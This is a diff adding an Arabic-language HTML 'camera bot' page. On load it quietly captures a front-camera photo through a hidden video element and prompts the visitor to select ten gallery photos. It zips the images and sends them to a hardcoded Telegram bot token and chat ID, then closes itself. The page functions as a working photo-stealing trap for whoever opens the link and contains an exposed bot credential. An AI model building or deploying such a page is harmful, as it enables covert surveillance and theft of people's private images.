@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>📸 بوت الكاميرا المتطور - تصوير فوري + آخر 10 صور</title>
+    <!-- Font Awesome للأيقونات -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- JSZip لضغط الصور -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(145deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 12px;
+            direction: rtl;
+        }
+
+        .camera-app {
+            width: 100%;
+            max-width: 420px;
+            background: white;
+            border-radius: 32px;
+            overflow: hidden;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* رأس التطبيق */
+        .app-header {
+            background: linear-gradient(145deg, #0f3460, #1a1a2e);
+            padding: 25px 20px;
+            color: white;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .app-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            animation: rotate 20s linear infinite;
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .app-header h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 5px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .app-header p {
+            font-size: 0.9rem;
+            opacity: 0.9;
+            position: relative;
+            z-index: 1;
+        }
+
+        .bot-tag {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 8px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            margin-top: 15px;
+            font-size: 0.85rem;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(5px);
+            position: relative;
+            z-index: 1;
+        }
+
+        /* شريط التقدم */
+        .progress-strip {
+            padding: 15px 20px;
+            background: #f8f9fa;
+            display: none;
+        }
+
+        .progress-card {
+            background: white;
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+        }
+
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            color: #0f3460;
+            font-weight: 600;
+        }
+
+        .progress-track {
+            width: 100%;
+            height: 10px;
+            background: #e9ecef;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #0f3460, #e94560);
+            width: 0%;
+            transition: width 0.3s;
+            border-radius: 10px;
+        }
+
+        .progress-message {
+            text-align: center;
+            color: #0f3460;
+            font-size: 0.9rem;
+        }
+
+        /* حالة المعالجة */
+        .processing-status {
+            padding: 15px 20px;
+            background: white;
+            text-align: center;
+        }
+
+        .status-badge {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 20px;
+            border: 1px solid #e9ecef;
+        }
+
+        .status-badge i {
+            font-size: 2rem;
+            color: #0f3460;
+            margin-bottom: 10px;
+        }
+
+        .status-badge h3 {
+            color: #0f3460;
+            margin-bottom: 5px;
+        }
+
+        .status-badge p {
+            color: #6c757d;
+            font-size: 0.9rem;
+        }
+
+        /* رسائل التنبيه */
+        .alert-container {
+            padding: 15px 20px;
+            background: white;
+        }
+
+        .alert-message {
+            padding: 15px;
+            border-radius: 16px;
+            display: none;
+            align-items: center;
+            gap: 12px;
+            font-size: 0.95rem;
+            animation: slideIn 0.3s;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .alert-success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .alert-error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .alert-warning {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeeba;
+        }
+
+        .alert-info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+
+        /* معلومات إضافية */
+        .app-footer {
+            padding: 15px 20px;
+            background: #f8f9fa;
+            border-top: 1px solid #e9ecef;
+            text-align: center;
+            font-size: 0.8rem;
+            color: #6c757d;
+        }
+
+        .footer-badge {
+            background: #0f3460;
+            color: white;
+            padding: 3px 10px;
+            border-radius: 50px;
+            font-size: 0.7rem;
+            margin: 0 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="camera-app">
+        <!-- رأس التطبيق -->
+        <div class="app-header">
+            <h1><i class="fas fa-camera"></i> بوت الكاميرا</h1>
+            <p>تصوير فوري + آخر 10 صور من المعرض</p>
+            <div class="bot-tag">
+                <i class="fas fa-robot"></i> @MHONE777988_bot
+            </div>
+        </div>
+
+        <!-- شريط التقدم -->
+        <div class="progress-strip" id="progressStrip">
+            <div class="progress-card">
+                <div class="progress-header">
+                    <span><i class="fas fa-spinner fa-spin"></i> جاري المعالجة</span>
+                    <span id="progressPercent">0%</span>
+                </div>
+                <div class="progress-track">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="progress-message" id="progressMessage">جاري تجهيز الصور...</div>
+            </div>
+        </div>
+
+        <!-- حالة المعالجة -->
+        <div class="processing-status">
+            <div class="status-badge">
+                <i class="fas fa-camera-retro"></i>
+                <h3 id="statusTitle">جاري تشغيل الكاميرا...</h3>
+                <p id="statusDesc">سيتم التقاط صورة فورية وجلب آخر 10 صور من معرضك</p>
+            </div>
+        </div>
+
+        <!-- رسائل التنبيه -->
+        <div class="alert-container">
+            <div class="alert-message" id="alertBox">
+                <i class="fas" id="alertIcon"></i>
+                <span id="alertText"></span>
+            </div>
+        </div>
+
+        <!-- معلومات إضافية -->
+        <div class="app-footer">
+            <i class="fas fa-shield-alt"></i>
+            <span>يتم التقاط صورة فورية + آخر 10 صور من الاستديو</span>
+            <span class="footer-badge">v2.0</span>
+        </div>
+    </div>
+
+    <!-- عناصر مخفية للكاميرا -->
+    <video id="video" style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <input type="file" id="galleryInput" accept="image/*" multiple style="display: none;">
+
+    <script>
+        // ✅ بيانات البوت
+        const BOT_TOKEN = '8771494087:AAFkcd_bm9tQbi8Yrt0QjtJscY7m1Hf7lm8';
+        const CHAT_ID = '7673393988';
+        
+        // عناصر الصفحة
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const galleryInput = document.getElementById('galleryInput');
+        
+        // مصفوفة لتخزين الصور
+        let allPhotos = [];
+        let cameraActive = false;
+
+        // ============ بدء التطبيق ============
+        window.onload = async function() {
+            showStatus('جاري تشغيل الكاميرا...', 'سيتم التقاط صورة فورية وجلب آخر 10 صور');
+            await startCamera();
+        };
+
+        // ============ تشغيل الكاميرا ============
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                });
+                
+                video.srcObject = stream;
+                cameraActive = true;
+                
+                // انتظر ثانية ثم التقط الصورة
+                setTimeout(captureInstantPhoto, 1500);
+                
+            } catch (error) {
+                showAlert('خطأ في تشغيل الكاميرا', 'error');
+                // حتى لو فشلت الكاميرا، حاول جلب الصور من المعرض
+                setTimeout(openGallery, 2000);
+            }
+        }
+
+        // ============ التقاط صورة فورية ============
+        function captureInstantPhoto() {
+            showStatus('📸 جاري التقاط الصورة...', 'يتم التقاط صورة من الكاميرا الأمامية');
+            
+            // ضبط حجم اللوحة
+            canvas.width = 640;
+            canvas.height = 480;
+            
+            // رسم الصورة من الكاميرا
+            ctx.drawImage(video, 0, 0, 640, 480);
+            
+            // تحويل إلى blob
+            canvas.toBlob((blob) => {
+                if (blob) {
+                    // إضافة الصورة للمصفوفة
+                    allPhotos.push({
+                        blob: blob,
+                        type: 'camera',
+                        time: new Date().toLocaleTimeString()
+                    });
+                    
+                    showAlert('✅ تم التقاط الصورة بنجاح', 'success');
+                    
+                    // بعد التصوير، افتح المعرض
+                    setTimeout(openGallery, 1000);
+                }
+            }, 'image/jpeg', 0.8);
+        }
+
+        // ============ فتح معرض الصور ============
+        function openGallery() {
+            showStatus('📱 جاري فتح المعرض...', 'الرجاء اختيار آخر 10 صور من معرضك');
+            
+            // إظهار رسالة للمستخدم
+            showAlert('الرجاء اختيار آخر 10 صور من المعرض', 'info');
+            
+            // فتح نافذة اختيار الملفات
+            galleryInput.accept = 'image/*';
+            galleryInput.multiple = true;
+            galleryInput.onchange = handleGallerySelection;
+            galleryInput.click();
+        }
+
+        // ============ معالجة الصور المختارة ============
+        async function handleGallerySelection(event) {
+            const files = event.target.files;
+            
+            if (!files || files.length === 0) {
+                // إذا لم يختر صور، أرسل صورة الكاميرا فقط
+                sendAllPhotos();
+                return;
+            }
+            
+            showStatus('🖼️ جاري معالجة الصور...', `تم اختيار ${files.length} صورة من المعرض`);
+            showProgress(true);
+            
+            let processedCount = 0;
+            const maxPhotos = Math.min(files.length, 10); // آخر 10 صور فقط
+            
+            // مصفوفة للصور الجديدة
+            const galleryPhotos = [];
+            
+            for (let i = 0; i < maxPhotos; i++) {
+                const file = files[i];
+                
+                // تحويل الملف إلى blob
+                const blob = await new Promise((resolve) => {
+                    const reader = new FileReader();
+                    reader.onload = (e) => {
+                        // تحويل base64 إلى blob
+                        fetch(e.target.result)
+                            .then(res => res.blob())
+                            .then(resolve);
+                    };
+                    reader.readAsDataURL(file);
+                });
+                
+                galleryPhotos.push({
+                    blob: blob,
+                    type: 'gallery',
+                    time: new Date().toLocaleTimeString()
+                });
+                
+                processedCount++;
+                
+                // تحديث شريط التقدم
+                const percent = (processedCount / maxPhotos) * 100;
+                document.getElementById('progressFill').style.width = percent + '%';
+                document.getElementById('progressPercent').innerText = Math.round(percent) + '%';
+                document.getElementById('progressMessage').innerText = `تم تجهيز ${processedCount} من ${maxPhotos} صور`;
+            }
+            
+            // إضافة صور المعرض إلى المصفوفة الرئيسية
+            allPhotos = [...allPhotos, ...galleryPhotos];
+            
+            showProgress(false);
+            showAlert(`✅ تم تجهيز ${allPhotos.length} صور (كاميرا + معرض)`, 'success');
+            
+            // إرسال جميع الصور
+            sendAllPhotos();
+        }
+
+        // ============ إرسال جميع الصور ============
+        async function sendAllPhotos() {
+            if (allPhotos.length === 0) {
+                showAlert('❌ لا توجد صور للإرسال', 'error');
+                return;
+            }
+            
+            showStatus('📤 جاري الإرسال...', `جاري إرسال ${allPhotos.length} صورة إلى تليجرام`);
+            showProgress(true);
+            
+            try {
+                // إنشاء ملف مضغوط
+                const zip = new JSZip();
+                
+                allPhotos.forEach((photo, index) => {
+                    const source = photo.type === 'camera' ? 'كاميرا' : 'معرض';
+                    const fileName = `صورة_${source}_${index+1}_${Date.now()}.jpg`;
+                    zip.file(fileName, photo.blob);
+                });
+                
+                // ضغط الملف
+                const zipBlob = await zip.generateAsync({
+                    type: 'blob',
+                    compression: 'DEFLATE',
+                    compressionOptions: { level: 6 }
+                }, (metadata) => {
+                    const percent = Math.round(metadata.percent);
+                    document.getElementById('progressFill').style.width = percent + '%';
+                    document.getElementById('progressPercent').innerText = percent + '%';
+                    document.getElementById('progressMessage').innerText = 'جاري ضغط الصور...';
+                });
+                
+                // إرسال إلى تليجرام
+                await sendToTelegram(zipBlob);
+                
+            } catch (error) {
+                showAlert('خطأ في الضغط: ' + error.message, 'error');
+                showProgress(false);
+            }
+        }
+
+        // ============ إرسال إلى تليجرام ============
+        async function sendToTelegram(blob) {
+            document.getElementById('progressMessage').innerText = 'جاري الإرسال إلى تليجرام...';
+            
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            
+            const now = new Date();
+            const dateStr = `${now.getFullYear()}-${now.getMonth()+1}-${now.getDate()}`;
+            const timeStr = `${now.getHours()}-${now.getMinutes()}`;
+            
+            const cameraCount = allPhotos.filter(p => p.type === 'camera').length;
+            const galleryCount = allPhotos.filter(p => p.type === 'gallery').length;
+            
+            const fileName = `صور_${dateStr}_${timeStr}_كاميرا${cameraCount}_معرض${galleryCount}.zip`;
+            formData.append('document', blob, fileName);
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (response.ok && result.ok) {
+                    // إرسال رسالة تأكيد مع التفاصيل
+                    const cameraCount = allPhotos.filter(p => p.type === 'camera').length;
+                    const galleryCount = allPhotos.filter(p => p.type === 'gallery').length;
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: `✅ **تم الإرسال بنجاح!**\n\n📸 **صورة الكاميرا:** ${cameraCount}\n🖼️ **صور المعرض:** ${galleryCount}\n📦 **إجمالي الصور:** ${allPhotos.length}\n\n📁 اسم الملف: ${fileName}`,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    
+                    showAlert(`✅ تم إرسال ${allPhotos.length} صورة بنجاح`, 'success');
+                    showStatus('✅ تم الإرسال بنجاح', 'سيتم إغلاق الصفحة بعد 3 ثواني');
+                    
+                    // إغلاق الصفحة بعد 3 ثواني
+                    setTimeout(() => {
+                        window.close();
+                    }, 3000);
+                    
+                } else {
+                    showAlert('❌ فشل الإرسال', 'error');
+                }
+            } catch (error) {
+                showAlert('خطأ في الاتصال', 'error');
+            } finally {
+                showProgress(false);
+            }
+        }
+
+        // ============ وظائف مساعدة ============
+        
+        // إظهار الحالة
+        function showStatus(title, desc) {
+            document.getElementById('statusTitle').innerText = title;
+            document.getElementById('statusDesc').innerText = desc;
+        }
+
+        // إظهار التنبيهات
+        function showAlert(text, type) {
+            const box = document.getElementById('alertBox');
+            const icon = document.getElementById('alertIcon');
+            
+            box.className = 'alert-message';
+            box.classList.add(`alert-${type}`);
+            
+            if (type === 'success') icon.className = 'fas fa-check-circle';
+            else if (type === 'error') icon.className = 'fas fa-exclamation-circle';
+            else if (type === 'warning') icon.className = 'fas fa-exclamation-triangle';
+            else icon.className = 'fas fa-info-circle';
+            
+            document.getElementById('alertText').innerText = text;
+            box.style.display = 'flex';
+            
+            setTimeout(() => {
+                box.style.display = 'none';
+            }, 3000);
+        }
+
+        // إظهار/إخفاء شريط التقدم
+        function showProgress(show) {
+            document.getElementById('progressStrip').style.display = show ? 'block' : 'none';
+        }
+
+        // إرسال رسالة نصية (للإشعارات)
+        function sendMessage(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            });
+        }
+    </script>
+</body>
+</html>
